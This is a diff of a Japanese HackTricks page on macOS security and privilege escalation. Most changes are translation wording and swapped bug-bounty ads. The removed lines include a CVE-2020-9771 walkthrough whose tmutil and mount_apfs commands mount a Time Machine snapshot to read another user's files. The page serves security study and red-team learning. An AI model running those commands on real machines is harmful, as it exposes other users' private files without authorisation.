@@ -4,7 +4,7 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
@@ -14,26 +14,24 @@
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProofはすべての暗号バグバウンティのホームです。**
+[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！
 
-**遅延なしで報酬を受け取る**\
-HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。
+**ハッキングの洞察**\
+ハッキングのスリルと課題に深く入り込むコンテンツに参加しましょう
 
-**Web3ペンテストの経験を積む**\
-ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のWeb3セキュリティをマスターしましょう。
+**リアルタイムのハックニュース**\
+リアルタイムのニュースと洞察を通じて、ハッキングの世界を最新の状態に保ちましょう
 
-**Web3ハッカーレジェンドになる**\
-各検証済みのバグで評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。
+**最新の発表**\
+最新のバグバウンティの開始や重要なプラットフォームの更新情報について、常に情報を得ましょう
 
-[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！
-
-{% embed url="https://hackenproof.com/register" %}
+**[Discord](https://discord.com/invite/N3FrSbmwdy)に参加して、トップハッカーとの協力を始めましょう！**
 
 ## 基本的なMacOS
 
 MacOSに慣れていない場合は、MacOSの基本を学ぶことから始めるべきです：
 
-* 特別なMacOSの**ファイルと権限：**
+* 特殊なMacOSの**ファイルと権限:**
 
 {% content-ref url="macos-files-folders-and-binaries/" %}
 [macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
@@ -68,7 +66,7 @@ MacOSに慣れていない場合は、MacOSの基本を学ぶことから始め�
 
 ### MacOS MDM
 
-企業では、**macOS**システムはおそらく**MDMで管理**される可能性が高いです。したがって、攻撃者の視点からは、**それがどのように機能するか**を知ることが興味深いです：
+企業では、**macOS**システムはおそらく**MDMで管理**されることが多いです。したがって、攻撃者の観点からは、**それがどのように機能するか**を知ることが興味深いです：
 
 {% content-ref url="../macos-red-teaming/macos-mdm/" %}
 [macos-mdm](../macos-red-teaming/macos-mdm/)
@@ -100,73 +98,36 @@ MacOSに慣れていない場合は、MacOSの基本を学ぶことから始め�
 
 **rootが使用するファイル**を**作成**できるようになると、ユーザーはその内容を利用したり、別の場所を指すために**シンボリックリンク/ハードリンク**を作成したりすることができます。
 
-このような脆弱性の場合、**脆弱な`.pkg`インストーラー**をチェックすることを忘れないでください：
+このような脆弱性をチェックする際には、**脆弱な`.pkg`インストーラー**を確認することを忘れないでください：
 
 {% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
 [macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
 {% endcontent-ref %}
-### プロセスの乱用による権限と特権の乱用
+### ファイル拡張子とURLスキームアプリハンドラ
 
-もしプロセスが、より高い権限や特権を持つ他のプロセスにコードを注入したり、それと連絡を取ったりして特権操作を実行できる場合、彼は特権を昇格させ、[Sandbox](macos-security-protections/macos-sandbox/)や[TCC](macos-security-protections/macos-tcc/)などの防御策をバイパスすることができます。
-
-{% content-ref url="macos-proces-abuse/" %}
-[macos-proces-abuse](macos-proces-abuse/)
-{% endcontent-ref %}
-
-### ファイル拡張子とURLスキームのアプリハンドラ
-
-ファイル拡張子によって登録された奇妙なアプリは乱用される可能性があり、異なるアプリケーションが特定のプロトコルを開くために登録されることがあります。
+ファイル拡張子によって登録された奇妙なアプリは悪用される可能性があり、異なるアプリケーションが特定のプロトコルを開くために登録されることがあります。
 
 {% content-ref url="macos-file-extension-apps.md" %}
 [macos-file-extension-apps.md](macos-file-extension-apps.md)
 {% endcontent-ref %}
 
-## MacOS特権昇格
+## macOS TCC / SIP特権エスカレーション
 
-### CVE-2020-9771 - mount\_apfs TCCバイパスと特権昇格
+macOSでは、**アプリケーションやバイナリにはアクセス権限**があり、他のものよりも特権を持つことができます。
 
-**どのユーザー**（特権を持たないユーザーも含む）でも、タイムマシンのスナップショットを作成し、マウントし、そのスナップショットの**すべてのファイルにアクセス**することができます。\
-必要なのは、使用されるアプリケーション（例：`Terminal`）が**フルディスクアクセス**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持つ必要があり、それは管理者によって許可される必要があります。
+したがって、macOSマシンを成功裏に侵害するためには、攻撃者は自身のTCC特権を**エスカレーション**する必要があります（または、必要に応じて**SIPをバイパス**する必要があります）。
 
-{% code overflow="wrap" %}
-```bash
-# Create snapshot
-tmutil localsnapshot
+これらの特権は、通常、アプリケーションが署名された**エンタイトルメント**の形で与えられるか、アプリケーションがいくつかのアクセスを要求し、**ユーザーが承認**した後、**TCCデータベース**に見つけることができます。プロセスがこれらの特権を取得する別の方法は、それらの特権を持つプロセスの**子プロセス**であることです。
 
-# List snapshots
-tmutil listlocalsnapshots /
-Snapshots for disk /:
-com.apple.TimeMachine.2023-05-29-001751.local
+これらのリンクをたどって、[**TCCで特権をエスカレーション**](macos-security-protections/macos-tcc/#tcc-privesc-and-bypasses)する方法、[**TCCをバイパス**](macos-security-protections/macos-tcc/macos-tcc-bypasses/)する方法、そして過去に[**SIPがバイパス**](macos-security-protections/macos-sip.md#sip-bypasses)された方法を見つけてください。
 
-# Generate folder to mount it
-cd /tmp # I didn it from this folder
-mkdir /tmp/snap
+## macOS伝統的な特権エスカレーション
 
-# Mount it, "noowners" will mount the folder so the current user can access everything
-/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
+もちろん、レッドチームの観点からは、ルートへのエスカレーションにも関心を持つべきです。いくつかのヒントについては、次の投稿をチェックしてください：
 
-# Access it
-ls /tmp/snap/Users/admin_user # This will work
-```
-{% endcode %}
-
-より詳しい説明は[**元のレポート**](https://theevilbit.github.io/posts/cve\_2020\_9771/)で見つけることができます。
-
-### 機密情報
-
-{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
-[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
+{% content-ref url="macos-privilege-escalation.md" %}
+[macos-privilege-escalation.md](macos-privilege-escalation.md)
 {% endcontent-ref %}
-
-### Linux Privesc
-
-まず、Linux/Unixに影響を与える特権昇格に関するほとんどのトリックは、MacOSマシンにも影響を与えることに注意してください。したがって、次を参照してください：
-
-{% content-ref url="../../linux-hardening/privilege-escalation/" %}
-[privilege-escalation](../../linux-hardening/privilege-escalation/)
-{% endcontent-ref %}
-
-## MacOSの防御アプリ
 
 ## 参考文献
 
@@ -178,29 +139,27 @@ ls /tmp/snap/Users/admin_user # This will work
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProofはすべての暗号バグバウンティの場です。**
+[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！
 
-**遅延なしで報酬を受け取る**\
-HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。
+**ハッキングの洞察**\
+ハッキングのスリルと課題に深く入り込むコンテンツに参加しましょう
 
-**Web3ペントestingの経験を積む**\
-ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。
+**リアルタイムのハックニュース**\
+リアルタイムのニュースと洞察を通じて、ハッキングの世界を最新の状態に保ちましょう
 
-**Web3ハッカーレジェンドになる**\
-各検証済みのバグで評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。
+**最新のお知らせ**\
+最新のバグバウンティの開始や重要なプラットフォームの更新情報を把握しましょう
 
-[**HackenProofにサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！
-
-{% embed url="https://hackenproof.com/register" %}
+**[Discord](https://discord.com/invite/N3FrSbmwdy)** に参加して、今日からトップハッカーと協力しましょう！
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを発見してください。
-* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見してください
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
 * **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。
 
 </details>
